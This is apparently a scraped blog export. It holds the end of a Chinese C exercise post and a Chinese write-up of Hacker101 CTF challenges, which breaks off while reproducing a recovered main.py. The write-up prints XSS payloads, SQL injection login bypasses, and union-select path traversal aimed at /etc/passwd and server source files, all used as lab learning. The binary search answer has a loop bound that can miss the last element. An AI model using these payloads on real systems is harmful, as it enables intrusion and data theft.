<h3 id="解答-10"><a href="#解答-10" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">even</span><span class="params">( <span class="type">int</span> n )</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> !(n%<span class="number">2</span>);</span><br><span class="line">    <span class="comment">/* N除2取余数，将余数值的非返回即成立</span></span><br><span class="line"><span class="comment">        3%2 = 1</span></span><br><span class="line"><span class="comment">        6%2 = 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-13-折半查找-15分"><a href="#6-13-折半查找-15分" class="headerlink" title="6-13 折半查找 (15分)"></a>6-13 折半查找 (15分)</h2><p>给一个严格递增数列，函数 <code>int Search_Bin(SSTable T, KeyType k)</code> 用来二分地查找k在数列中的位置。<br>函数接口定义：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c++</div></div><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span>  <span class="title">Search_Bin</span><span class="params">(SSTable T, KeyType k)</span></span></span><br></pre></td></tr></table></figure></div>
<p>其中T是有序表，k是查找的值。</p>
<h3 id="裁判测试程序样例：-12"><a href="#裁判测试程序样例：-12" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c++</div></div><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 50</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>  <span class="keyword">struct</span>                     </span><br><span class="line">&#123; KeyType  key;                                             </span><br><span class="line">&#125; ElemType;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>  <span class="keyword">struct</span></span><br><span class="line">&#123; ElemType  *R; </span><br><span class="line">  <span class="type">int</span>  length;</span><br><span class="line">&#125; SSTable;                      </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">Create</span><span class="params">(SSTable &amp;T)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="type">int</span> i;</span><br><span class="line">  T.R=<span class="keyword">new</span> ElemType[MAXSIZE+<span class="number">1</span>];</span><br><span class="line">  cin&gt;&gt;T.length;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=T.length;i++)</span><br><span class="line">     cin&gt;&gt;T.R[i].key;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">Search_Bin</span><span class="params">(SSTable T, KeyType k)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;  SSTable T;  KeyType k;</span><br><span class="line">   <span class="built_in">Create</span>(T);</span><br><span class="line">   cin&gt;&gt;k;</span><br><span class="line">   <span class="type">int</span> pos=<span class="built_in">Search_Bin</span>(T,k);</span><br><span class="line">   <span class="keyword">if</span>(pos==<span class="number">0</span>) cout&lt;&lt;<span class="string">&quot;NOT FOUND&quot;</span>&lt;&lt;endl;</span><br><span class="line">   <span class="keyword">else</span> cout&lt;&lt;pos&lt;&lt;endl;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 请在这里填写答案 */</span></span><br></pre></td></tr></table></figure></div>
<p>然后是输入输出样式：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一行输入一个整数n，表示有序表的元素个数</span><br><span class="line">接下来一行n个数字，依次为表内元素值。</span><br><span class="line">然后输入一个要查找的值。</span><br><span class="line">5</span><br><span class="line">1 3 5 7 9</span><br><span class="line">7</span><br><span class="line"></span><br><span class="line">输出这个值在表内的位置</span><br><span class="line">如果没有找到，输出&quot;NOT FOUND&quot;。</span><br><span class="line">4</span><br></pre></td></tr></table></figure></div>

<h3 id="解答-11"><a href="#解答-11" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>  <span class="title function_">Search_Bin</span><span class="params">(SSTable T, KeyType k)</span> &#123;</span><br><span class="line">	<span class="type">int</span> left = <span class="number">1</span>; <span class="comment">//左边起始点</span></span><br><span class="line">    <span class="type">int</span> right = T.length; <span class="comment">// 链表最后一位</span></span><br><span class="line">    <span class="type">int</span> mid;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(T.R[mid].key == k) &#123; <span class="comment">// 找到k, k为T.R[mid].key</span></span><br><span class="line">            <span class="keyword">return</span> mid;  <span class="comment">// 返回mid即k的位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(T.R[mid].key &gt; k) &#123; <span class="comment">// k在中间偏左</span></span><br><span class="line">            right = mid<span class="number">-1</span>; <span class="comment">// 使右边界收缩到 中间左一</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// k在中间偏右</span></span><br><span class="line">            left = mid+<span class="number">1</span>; <span class="comment">// 使左边界收缩到 中间右一</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//重复以上操作，直至左右边界相遇</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>Hacker101 CTF writeup</title>
    <url>/yakko117/2019/07/07/hacker101/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近的实训实在不高兴学，但是又被逼着每天花时间在上<br>导致自己摸鱼很长一段时间，没怎么认真去做题<br>[题目链接][<a href="https://ctf.hacker101.com/ctf]">https://ctf.hacker101.com/ctf]</a><br>PS:(一开始没看到flag提交页面，搞得多花了些时间重新写题)</p>
<hr>
<h2 id="A-little-something-to-get-you-started"><a href="#A-little-something-to-get-you-started" class="headerlink" title="A little something to get you started"></a>A little something to get you started</h2><p>进入题目，简单一句话</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu3558uj30pi07uweq.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu3558uj30pi07uweq.jpg" class="lazyload"></a></p>
<p>查看源码，发现关键点 <code>background.png</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu35nsnj30f909dmxm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu35nsnj30f909dmxm.jpg" class="lazyload"></a></p>
<p>进入 <code>background.png</code>， 得到flag</p>
<hr>
<h2 id="Micro-CMS-v1"><a href="#Micro-CMS-v1" class="headerlink" title="Micro-CMS v1"></a>Micro-CMS v1</h2><p>题目说明有4个flag，那就慢慢来</p>
<h3 id="flag0"><a href="#flag0" class="headerlink" title="flag0"></a>flag0</h3><p>点开题目，发现页面可通过 <code>Edit this page</code>， 修改内容<br>然后发现熟悉的提交栏，猜测存在 <code>xss 注入</code>，尝试在标题注入，回显得到 <code>flag</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu35orpj30hy09zdfy.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu35orpj30hy09zdfy.jpg" class="lazyload"></a></p>
<hr>
<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>发现在无论是编辑栏还是页面栏，发现页面是以数字为顺序排列，不妨试一试sql注入，在 <code>Edit</code> 栏发现存在注入， 尝试添加引号，得到 <code>flag</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu3772lj30z20jpgmd.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu3772lj30z20jpgmd.jpg" class="lazyload"></a></p>
<hr>
<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>既然标题能够注入，我们再试一下在内容注入，发现waf了 <code>script</code>那我们就注入<br>那我们就注入 <code>&lt;img src=&#39;test&#39; onclick=&#39;alert(1)&#39;&gt;</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu37dh7j30w8064glt.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu37dh7j30w8064glt.jpg" class="lazyload"></a><br>一开始等了半天，以为和原来一样要点 <code>&lt;-- Go Home</code> 才刷新回显<br>后来在源码里看到flag了 （&#x3D; &#x3D;）</p>
<hr>
<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>我们发现创建的新页面，直接编号为10，中间的3-9哪去了</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu36qkrj30i90b03yo.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu36qkrj30i90b03yo.jpg" class="lazyload"></a></p>
<p>然后发现 修改页面编号3 发现没有URL，继续尝试，页面为6时，得到flag</p>
<hr>
<h2 id="Micro-CMS-v2"><a href="#Micro-CMS-v2" class="headerlink" title="Micro-CMS v2"></a>Micro-CMS v2</h2><h3 id="flag0-1"><a href="#flag0-1" class="headerlink" title="flag0"></a>flag0</h3><p>题目是sql注入<br>尝试 <code>admin</code> 发现回显是 <code>Unknown user</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu3917aj30hg0bxwem.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu3917aj30hg0bxwem.jpg" class="lazyload"></a></p>
<p>注入 <code>admin&#39;</code> 发现</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Traceback (most recent <span class="keyword">call</span> <span class="keyword">last</span>):</span><br><span class="line">  File &quot;./main.py&quot;, line <span class="number">145</span>, <span class="keyword">in</span> do_login</span><br><span class="line">    if cur.execute(<span class="string">&#x27;SELECT password FROM admins WHERE username=\&#x27;</span><span class="operator">%</span>s\<span class="string">&#x27;&#x27;</span> <span class="operator">%</span> request.form[<span class="string">&#x27;username&#x27;</span>].replace(<span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;%%&#x27;</span>)) <span class="operator">=</span><span class="operator">=</span> <span class="number">0</span>:</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py&quot;, line <span class="number">255</span>, <span class="keyword">in</span> <span class="keyword">execute</span></span><br><span class="line">    self.errorhandler(self, exc, <span class="keyword">value</span>)</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py&quot;, line <span class="number">50</span>, <span class="keyword">in</span> defaulterrorhandler</span><br><span class="line">    raise errorvalue</span><br><span class="line">ProgrammingError: (<span class="number">1064</span>, &quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;admin&#x27;&#x27;&#x27; at line 1&quot;)</span><br></pre></td></tr></table></figure></div>

<p>尝试注入 <code>admin&#39; or &#39;&#39;=&#39;</code> (不是双引号 是两个单引号)</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu39getj30gl0awwem.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu39getj30gl0awwem.jpg" class="lazyload"></a></p>
<p>回显变成了 <code>Invalid password</code>, 说明 <code>admin&#39; or &#39;&#39;=&#39;</code> 虽然不存在，但被认为是合法的用户名，所以依据反馈的不同可以进行布尔注入<br>看了hint 有个提示是</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Getting admin access might require a more perfect union</span><br></pre></td></tr></table></figure></div>

<p>尝试：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名:admin&#x27; union select &#x27;123456</span><br><span class="line">用户名:123456</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu393ilj30g008o74l.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu393ilj30g008o74l.jpg" class="lazyload"></a></p>
<p>登陆成功 回显出一个新的 <code>Private Page</code> ，点开得到flag</p>
<hr>
<h3 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h3><p>hint2 如下</p>
<blockquote>
<p>What actions could you perform as a regular user on the last level, which you can’t now?<br>Just because request fails with one method doesn’t mean it will fail with a different method<br>Different requests often have different required authorization。</p>
</blockquote>
<p>貌似是要用不同的请求方法去请求原本访问不了的页面，刚刚的Private page的url为page&#x2F;3,其编辑页面为page&#x2F;edit&#x2F;3，这两个页面都是需要登陆才能访问的，我们依照提示换一下请求方法为POST，成功获取了flag1：</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqeqqdj316r08mabr.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqeqqdj316r08mabr.jpg" class="lazyload"></a></p>
<hr>
<h2 id="Photo-Gallery"><a href="#Photo-Gallery" class="headerlink" title="Photo Gallery"></a>Photo Gallery</h2><h3 id="flag0-2"><a href="#flag0-2" class="headerlink" title="flag0"></a>flag0</h3><p>点开题目，看到的是这个样子的图</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lr0gb4j30p80sx11i.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lr0gb4j30p80sx11i.jpg" class="lazyload"></a></p>
<p>发现有张图看不到，接着查看源码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div></div><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Magical Image Gallery<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>Magical Image Gallery<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Kittens<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> =<span class="string">&quot;fetch?id=1&quot;</span> <span class="attr">width</span>=<span class="string">&quot;266&quot;</span> <span class="attr">height</span>=<span class="string">&quot;150&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>Utterly adorable<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> =<span class="string">&quot;fetch?id=2&quot;</span> <span class="attr">width</span>=<span class="string">&quot;266&quot;</span> <span class="attr">height</span>=<span class="string">&quot;150&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>Purrfect<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> =<span class="string">&quot;fetch?id=3&quot;</span> <span class="attr">width</span>=<span class="string">&quot;266&quot;</span> <span class="attr">height</span>=<span class="string">&quot;150&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>Invisible<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">i</span>&gt;</span>Space used: 0	total<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>从源码中可以看出来，猫的图片是通过 <code>fetch?id=X</code> 这种方式加载的,我们在浏览器中访问一下</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqxp9aj31710oodlt.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqxp9aj31710oodlt.jpg" class="lazyload"></a></p>
<p>似乎返回了一张图片的内容，我们在linux下执行</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqviqlj30ts03cjtr.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqviqlj30ts03cjtr.jpg" class="lazyload"></a></p>
<p>将这段信息保存为 <code>1.jpg</code> ，查看可以看到这的确是第一张猫的照片。我们再访问 <code>fetch?id=2</code>，同样返回了第二张猫的照片内容；然后尝试 <code>fetch?id=2-1</code>， 发现回显的是第一个图片的内容，<code>2-1</code> 被解析了，那么id参数很可能传递到了后台脚本的数据库逻辑中，所以这里很可能有注入<br>（别问，问就是sqlmap一把梭）</p>
<p>然后得到了两张表<br>Table1:albums</p>
<p><strong>id title</strong><br>1 Kittens<br>Table:photos</p>
<p><strong>| id title | Parent filename |</strong><br>|1 Utterly adorable | 1	files&#x2F;adorable.jpg|<br>|2 Purrent | 1 	files&#x2F;purrfect.jpg|<br>|3 Invisible | 1 f8f1e29a43623363a3f53cede84d8c845a1c58076bcbf668c5372b593b7ef71d|</p>
<p>虽然没有flag，但是看到表 <code>photo</code> 中的 <code>filename</code> 文件显示了照片的储存路径，也就是说，后台处理逻辑上通过URL中传递<code>id</code>参数，来从数据库获得照片文件路径，然后通过读取文件返回给我们，猜测sql语句是这么写的</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> filename <span class="keyword">from</span> photo <span class="keyword">where</span> id <span class="operator">=</span> N;</span><br></pre></td></tr></table></figure></div>

<p>既然存在sql漏洞，我们以此控制sql的查询结果也就是filename，进而读取我们控制的filename，以此验证一下，先访问URL：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch?id=4</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqb8m3j30vl0700sy.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqb8m3j30vl0700sy.jpg" class="lazyload"></a></p>
<p>如数据库结果所呈现，表photos中id&#x3D;4时没有对应记录,然后访问url：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch?id=4 union select &#x27;files/adorable.jpg&#x27; --</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lrqwq3j311k0gcadj.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lrqwq3j311k0gcadj.jpg" class="lazyload"></a></p>
<p>奈斯，然后尝试前不久学的命令执行漏洞</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch?id=4 union select &#x27;../../../../../../../etc/passwd&#x27; --</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqv5goj30vq07bmxi.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqv5goj30vq07bmxi.jpg" class="lazyload"></a></p>
<p>发现不太行，可能是后台逻辑对读取文件路径进行了处理，<code>waf</code> 了 <code>..</code>，我试了一下访问URL</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch?id=4 union select &#x27;files/a..dorable.jpg&#x27; --</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqwza2j314z0jjtd3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqwza2j314z0jjtd3.jpg" class="lazyload"></a></p>
<p>似乎只能读当前目录及子目录了，看能不能读取主页代码，尝试访问url:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch?id=4 union select &#x27;index.php&#x27; --</span><br><span class="line">fetch?id=4 union select &#x27;index.html&#x27; --</span><br></pre></td></tr></table></figure></div>
<p>查看hint后，发现是一个<code>uwsgi-nginx-flask</code>框架</p>
<blockquote>
<p>uWSGI是一个Web服务器，它实现了WSGI协议、uwsgi、http等协议。Nginx中HttpUwsgiModule的作用是与uWSGI服务器进行交换。WSGI是一种Web服务器网关接口。它是一个Web服务器（如nginx，uWSGI等服务器）与web应用（如用Flask框架写的程序）通信的一种规范。</p>
</blockquote>
<p>百度查看了其部署框架，大概如下</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|____docker-compose.yaml</span><br><span class="line">|____web</span><br><span class="line">| |____Dockerfile</span><br><span class="line">| |____entrypoint.sh</span><br><span class="line">| |____start.sh</span><br><span class="line">| |____app</span><br><span class="line">| | |______init__.py</span><br><span class="line">| | |____models.py</span><br><span class="line">| | |____views.py</span><br><span class="line">| | |____requirements.txt</span><br><span class="line">| | |____utils.py</span><br><span class="line">| | |____helper.py</span><br><span class="line">| | |____settings.py</span><br><span class="line">| | |____app.py</span><br><span class="line">| | |____uwsgi.ini</span><br><span class="line">|____README.md</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker-compose.yaml和web文件夹和最外层readme.md同目录</span><br><span class="line">web下面：Dockerfile， entrypoint.sh， start.sh, app</span><br><span class="line">app下面：app.py, uwsgi.ini, requirements.txt, models.py, views.py等</span><br></pre></td></tr></table></figure></div>

<p>其中uwsgi.ini是uWSGI的配置文件，我们访问url:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch?id=4 union select &#x27;uwsgi.ini&#x27; --</span><br></pre></td></tr></table></figure></div>

<p>读取了它的内容：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[uwsgi] module = main callable = app</span><br></pre></td></tr></table></figure></div>

<p>查看Uwsgi参数定义<br><code>module = main</code><br>表示加载一个main.py这个模块，这应该是这个web应用的主要代码，我们继续读取main.py</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lr52p7j312u0j240g.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lr52p7j312u0j240g.jpg" class="lazyload"></a></p>
<p>main.py的代码整理如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, abort, redirect, request, Response</span><br><span class="line"><span class="keyword">import</span> base64, json, MySQLdb, os, re, subprocess</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">home = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">	&lt;head&gt;</span></span><br><span class="line"><span class="string">		&lt;title&gt;Magical Image Gallery&lt;/title&gt;</span></span><br><span class="line"><span class="string">	&lt;/head&gt;</span></span><br><span class="line"><span class="string">	&lt;body&gt;</span></span><br><span class="line"><span class="string">		&lt;h1&gt;Magical Image Gallery&lt;/h1&gt;</span></span><br><span class="line"><span class="string">$ALBUMS$</span></span><br><span class="line"><span class="string">	&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">viewAlbum = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">	&lt;head&gt;</span></span><br><span class="line"><span class="string">		&lt;title&gt;$TITLE$ -- Magical Image Gallery&lt;/title&gt;</span></span><br><span class="line"><span class="string">	&lt;/head&gt;</span></span><br><span class="line"><span class="string">	&lt;body&gt;</span></span><br><span class="line"><span class="string">		&lt;h1&gt;$TITLE$&lt;/h1&gt;</span></span><br><span class="line"><span class="string">$GALLERY$</span></span><br><span class="line"><span class="string">	&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span 